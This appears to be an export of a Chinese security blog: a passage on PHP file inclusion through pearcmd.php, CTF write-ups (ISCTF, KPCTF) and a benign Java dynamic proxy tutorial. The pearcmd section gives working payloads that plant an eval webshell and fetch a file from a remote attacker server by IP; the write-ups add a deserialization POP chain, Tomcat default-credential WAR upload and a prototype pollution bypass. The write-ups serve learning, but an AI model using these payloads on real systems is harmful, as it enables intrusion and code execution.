<p>而<code>$argv</code> 就是我们使用pear时的参数。<br>既然可以操控参数，那么我们就可以使用pear这个工具了<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/3.png" class="" title="alt text"><br>我们可以看到paer有很多的功能，p神的文章里介绍了config-create这个方法</p>
<h2 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h2><p>经过尝试发现这个功能会将第一个目录的目录名写入到第二目录里即<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear config-create &#x27;/etc/passwd&#x27; /tmp/LSE</span><br></pre></td></tr></table></figure><br>的结果如下<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/6.png" class="" title="alt text"><br>我们会发现其并不是将/etc/passwd的内容写入到/tmp/LSE而是直接将这个文件路径写入到/tmp/LSE<br>那么我们用如下命令就可以成功将马写入到/tmp/xxx.php<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear config-create &#x27;/&lt;?php phpinfo();?&gt;&#x27; /tmp/LSE</span><br></pre></td></tr></table></figure><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/4.png" class="" title="alt text"><br>我们需要在最前面写一个/来表示这个为一个路径<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/5.png" class="" title="alt text"><br>那么我们将上面的命令行变为web传参即为如下<br>若为POST传参导致的文件包含<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /?+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">2</span>]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span>+/tmp/LSE.php HTTP/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure><br>如果为GET传参导致的<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?=</span><span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/7.png" class="" title="alt text"><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/8.png" class="" title="alt text"></p>
<h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p>install这个功能可以远程下载。默认下载到的位置为/tmp/pear/download<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/9.png" class="" title="alt text"><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/10.png" class="" title="alt text"><br>若为POST可以直接使用<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/5.png" class="" title="alt text"><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/6.png" class="" title="alt text"><br>若为GET我们需要引入一个参数—installroot<br>这个参数可以控制我们下载文件的位置<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/12.png" class="" title="alt text"><br>可以发现其下载的实际位置是<code>当前位置+/xxxx/tmp/pear/download</code><br>在web中当前位置一般为/var/www/html<br>xxxx为指定参数<br>其paylaod为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/share/php/pearcmd.php&amp;+http://[vps]/xxx.xxx</span><br></pre></td></tr></table></figure><br>而最终下载的位置为<code>/var/www/html/&amp;file=/usr/share/php/pearcmd.php/tmp/pear/download/a.php</code></p>
<h2 id="download"><a href="#download" class="headerlink" title="download"></a>download</h2><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/13.png" class="" title="alt text">
<p>我们可以发现pear download下载为当前目录<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/14.png" class="" title="alt text"><br>由于该方法无法指定位置所以需要我们在vps创建一个目录为&amp;file=/usr/share/php/pearcmd.php即恶意文件叫pearcmd.php那么我们就可以在包含的同时下载这个恶意文件了<br>payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?+download+http://111.230.38.159:8000/&amp;file=/usr/share/php/pearcmd.php</span><br></pre></td></tr></table></figure><br>同样的install也可以使用这个方法来下载到默认位置</p>
<h1 id="如果pearcmd-php被搬了怎么办"><a href="#如果pearcmd-php被搬了怎么办" class="headerlink" title="如果pearcmd.php被搬了怎么办"></a>如果pearcmd.php被搬了怎么办</h1><p>可以尝试使用peclcmd.php<br>peclcmd.php和pearcmd.php位于同一目录。<br>因为这个文件包含了pearcmd.php<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/15.png" class="" title="alt text"></p>
]]></content>
      <categories>
        <category>php</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCTF的wp</title>
    <url>/2023/11/28/ISCTF%E7%9A%84wp/</url>
    <content><![CDATA[<h1 id="还是tcl并没有写出来几题但是有学到不少。"><a href="#还是tcl并没有写出来几题但是有学到不少。" class="headerlink" title="还是tcl并没有写出来几题但是有学到不少。"></a>还是tcl并没有写出来几题但是有学到不少。</h1><p>1.圣杯战争！！<br>当我看到这道题的时候我马上就发现这个新生赛和我之前做的完全不是一个等级的，刚开始做这题的使用由于本人不会php的序列化和反序列化所以这题是我学习了很久才做出这道题目。学习过程在这里<a href="https://lisien11.github.io/2023/11/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">序列化与反序列化的学习</a><br><img src="/2023/11/28/ISCTF%E7%9A%84wp/1-1.png" class="" title="Alt text"><br>这道题目的提示做的很明显，出题人将构造pop链的顺序都和我们说了。我们要从summon到artifact到preoare到saber，<br>我们可以先个$Saber赋值为对象artifact那么当输出$Saber时会因为错误的将对artifact当成字符串输出那么就会触发artifact的<strong>tostring()，我们再将变量$excalibuer赋值为对象prepare那么就会错误的调用没有的成员属性从而触发</strong>get($key)我们再将$release赋值为saber那么就会因为错误的将对象saber当成函数触发从而触发__invoke()那么我们就可以对成功链接到我们的目标函数include()了，接下来我们应该对weapon进行赋值从而得到flag<br>这道题目除了考察php的序列化和反序列化还考查看了php的反序列化也就是关于最终include()的利用我们可以再include函数里输入一个php伪协议从而得到flag<br><a href="">php伪协议</a><br>我们只要将weapon赋值为<code>php://filter/read=convert.base64-encode/resource=flag.php</code><br>我们将上面的所以整合在一起构造pop链代码如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">artifact</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$excalibuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arrow</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prepare</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$release</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">saber</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Saber</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Rider</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">summon</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">artifact</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">prepare</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">saber</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;Saber=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;excalibuer=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;release=<span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight php"><figcaption><span>输出</span></figcaption><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;summon&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Saber&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;artifact&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;excalibuer&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;prepare&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;release&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;saber&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;weapon&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;&#125;s:<span class="number">5</span>:<span class="string">&quot;arrow&quot;</span>;N;&#125;s:<span class="number">5</span>:<span class="string">&quot;Rider&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><br>将输出的结果用GET传值到payload里我们就可以得到base64编码后的flag将其解码后即可<br>2.where_is_the_flag<br>打开题目我们可以发现显示了一句话木马<br><img src="/2023/11/28/ISCTF%E7%9A%84wp/2-1.png" class="" title="Alt text"><br>我们直接使用蚁剑进行连接<img src="/2023/11/28/ISCTF%E7%9A%84wp/2-2.png" class="" title="Alt text"><br>我们可以发现两个文件一个是flag2另一个为start.sh的文件打开start.sh文件发现里面写上了php代码<img src="/2023/11/28/ISCTF%E7%9A%84wp/2-3.png" class="" title="Alt text"><br>我们可以看到第二行的代码sed -i是linux对文件修改的指令，s是对文件内容替换，为要替换的字符串，${FLAG:0:10}为替换的内容为FLAG从第1个开始的10个字符，而后面的路径为要修改的文件位置，结合起来就是将FLAG的前10位写入flag.php中我们可以直接用蚁剑查看flag.php,<br>第3行的代码是将FLAG的10到20个字符传到flag2里<br>export函数是将变量输出为环境变量，也就是将FLAG 20为以后的数替换到FLAG3里后导入到环境变量中，我们可以直接在蚁剑的虚拟终端里echo FLAG3对flag3进行输出最后组合在一起就是flag了啦<br>3.绕进你心里<br>这道题前面是几个简单的绕过<br><img src="/2023/11/28/ISCTF%E7%9A%84wp/3-1.png" class="" title="Alt text"><br>第一个md5绕过由于是强比较所有我们只能使用数组绕过，由于当我们传入数组道md5函数里md5函数就会返回null这样就可以绕过<br>第二个只要num传入非数字就可以了<br>而最后一个绕过中+？的意思是匹配任意除回车以外的字符，i表示这是一个对大小写不敏感的匹配，s可以匹配任意字符包括回车。<br>而下语句中stripos是一个大小写不敏感的匹配，观察代码我们发现我们需要输入2023ISCTF有不能再ISCTF前添加字符，发现我们无法以常规方法绕过，所有我们这个绕过要用到正则回溯<br>正则表达式在进行匹配时会发生正则回溯，而正则匹配有个上限，上线为一百万那么我们只需要在2023ISCTF前输入100万个字符那么就会超过回溯上限，这时候我们可以利用以下python代码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">res = requests.post(<span class="string">&quot;网站url&quot;</span>,data = &#123;<span class="string">&quot;str&quot;</span>:<span class="string">&quot;a&quot;</span>*<span class="number">1000000</span>+<span class="string">&quot;2023ISCTF&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><br>运行后就会输出flag</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>JDK动态代理</title>
    <url>/2024/09/26/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h1 id="为什么要动态代理"><a href="#为什么要动态代理" class="headerlink" title="为什么要动态代理"></a>为什么要动态代理</h1><p>想要知道为什么需要动态代理我们需要先知道什么是静态代理，有了静态代理为什么又需要动态代理</p>
<p>首先其实代理就是将一个实现接口的类，进行调用的类，其可以在调用的继承上增加一些自己的功能<br>一个简单的DEMO代码如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//User.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//UserProxy.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        user.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用getName&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Main.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        UserProxy proxy= <span class="keyword">new</span> <span class="title class_">UserProxy</span>(user);</span><br><span class="line">        proxy.getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在我们运行Main时，通过了UserProxy这个代理来调用了User的getName()方法并且因为代理自身添加了一些功能还会输出调用getName，其实这就是一个简单的日志功能<br><img src="/2024/09/26/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/1.png" class="" title="alt text"><br>但是这种静态代理有个很明显的弊端就是如果接口发送修改，我们不仅要修改完成接口的User.javaha还要修改我们的代理类，这是非常繁琐的。<br>所以我们需要运用动态代理。</p>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>动态代理我们需要用到下面的方法来获取动态代理类<br>Proxy.newProxyInstance()<br>这个方法接受三个参数，需要代理的类的加载器，需要代理的类的接口，继承了InvocationHandler的类<br>DEMO的代码如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Main.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        InvocationHandler handler=<span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        IUser proxy=(IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),handler);</span><br><span class="line">        proxy.getName();</span><br><span class="line">        proxy.getage();</span><br><span class="line">        proxy.gethigh();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserInvocationHandler.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">        IUser user;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.user = user;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            method.invoke(user, args);</span><br><span class="line">            System.out.println(<span class="string">&quot;调用&quot;</span>+method.getName());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//User.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getage</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;18&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">gethigh</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;181&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getage</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">gethigh</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>上面的代码实现了一个简单的动态代理。其中定义的UserInvocationHandler.java是一个实现了InvocationHandler接口的一个类。该接口需要实现一个invoke方法该方法在动态代理类proxy调用了一个方法时触发，而invok中的实例user需要我们自己在构造方法中定义。<br><img src="/2024/09/26/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/3.png" class="" title="alt text"><br>其实动态代理的过程就是我们定义的一个代理proxy调用了一个方法如proxy.getname时会自动跳到我们在定义这个proxy时传入的第三个参数的UserInvocationHandler类的invoke方法，然后运行invoke方法。<br>这个调用动态代理的知识点在学习CC1中的LazyMap的调用链的过程中有用到</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JDK动态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>KPCTF-初赛wp</title>
    <url>/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/</url>
    <content><![CDATA[<h1 id="Sign-1n"><a href="#Sign-1n" class="headerlink" title="Sign_1n"></a>Sign_1n</h1><p>签到题打开发现为Apache Tomcat/8.0.43在网上搜索会发现该版本存在后台弱口令+文件上传getshell<br>访问/manager/html路由tomcat/tomcat登陆<br>登陆后台会发现其存在war包上传<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/2.png" class="" title="alt text"><br>写一个蚁剑的shell.jsp压缩后,后缀改为war上传后在蚁剑连接<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/5.png" class="" title="alt text"><br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/3.png" class="" title="alt text"><br>在根目录发现flag</p>
<h1 id="How-to-get-the-flag"><a href="#How-to-get-the-flag" class="headerlink" title="How to get the flag"></a>How to get the flag</h1><p>打开后查看index.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// flag in flag.php</span></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9\/.]+$/&#x27;</span>, <span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\.\.)|(\.\/)/&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/tmp/&#x27;</span>.<span class="variable">$file</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>我们会发现存在文件包含并且只能读取/tmp文件下的内容<br>扫描后台发现存在flag.php和phpinfo.php<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/7.png" class="" title="alt text"><br>仔细查看会发现其打开了Opcache<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/8.png" class="" title="alt text"><br>我们查一下会发现Opcache会将访问过的php文件进行缓存,该题的存储位置为/tmp<br>存储的结构为/tmp/system_id/var/www/html/xxx.php.bin<br>既然我们要读取flag.php的内容那么我们读取其缓存文件即可。那么我们的问题就变成了怎么得到这system_id<br>在php8版本system_id与这几个参数有光<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 版本号</span><br><span class="line">Zend Extension	</span><br><span class="line">如果是dev版本的还与编译时间有关</span><br></pre></td></tr></table></figure><br>该题的版本是8.0.30我们下载源码会发现其源码的Zend Extension和题目的Zend Extension    是一样的<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/9.png" class="" title="alt text"><br>即我们直接在本地的liunx编译这个版本的php并打开php.ini中的Opcache<br>开启php服务<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><br>访问index.php<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/10.png" class="" title="alt text"><br>可以发现system_id<br>这样我们就得到了system_id<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/11.png" class="" title="alt text"><br>读取flag.php.bin文件</p>
<h1 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass_it"></a>Bypass_it</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/12.png" class="" title="alt text">
<p>查看源码我们会发现其明显存在一个原型链污染。<br>我们寻找merge函数会发现在登陆前使用了这个函数<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/13.png" class="" title="alt text"><br>而下面的<code>/Access_Key_id</code>路由的登陆判断为cookie中的user的值为SECRET<em>COOKIE,或者req.user为admin，因为req.user的值是不存在的，那么我们就可以污染其原型的user为admin以此来绕过登陆验证<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/14.png" class="" title="alt text"><br>我们可以看到其污染位置过滤了`<em>_proto</em></em><code>我们可以使用</code>{“constructor”:{“prototype”:{}}}`来绕过</p>
<img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/20.png" class="" title="alt text">
<img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/21.png" class="" title="alt text">
<p>得到flag1<br>我们继续查看代码会发现<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Secret_Access_KeyController</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span> ? req.<span class="property">body</span>.<span class="property">checkcode</span> : <span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (checkcode.<span class="property">length</span> === <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span> (checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>) &#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (__) &#123; &#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123; <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;You Got Secret_Access_Key: &quot;</span> + <span class="title class_">Secret</span>_Access_Key.<span class="title function_">toString</span>().<span class="title function_">trim</span>() &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123; <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以发现catch 处会抛出SK的值即flag2。那么我们只有让其在checkcode = checkcode.toLowerCase()处报错即可，我们直接令checkcode为数组并有16个元素即可<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/22.png" class="" title="alt text"></p>
<p>得到flag2</p>
<h1 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s_this"></a>What’s_this</h1><p>打开后扫目录会发现webshell.php代码如下<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/23.png" class="" title="alt text"><br>因为太长了所以我直接截图了如果复制的话转pdf会很难看<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/16.png" class="" title="alt text"><br>我们直接输出变量，并将eval只能的参数内容echo出来<br>会发现其套了娃，我们继续输出eval运行的参数<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/17.png" class="" title="alt text"><br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/18.png" class="" title="alt text"><br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/19.png" class="" title="alt text"><br>就这样重复的输出eval的参数会得到最后的shell的内容我们可以发现其参数为q<br>直接命令执行<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/24.png" class="" title="alt text"></p>
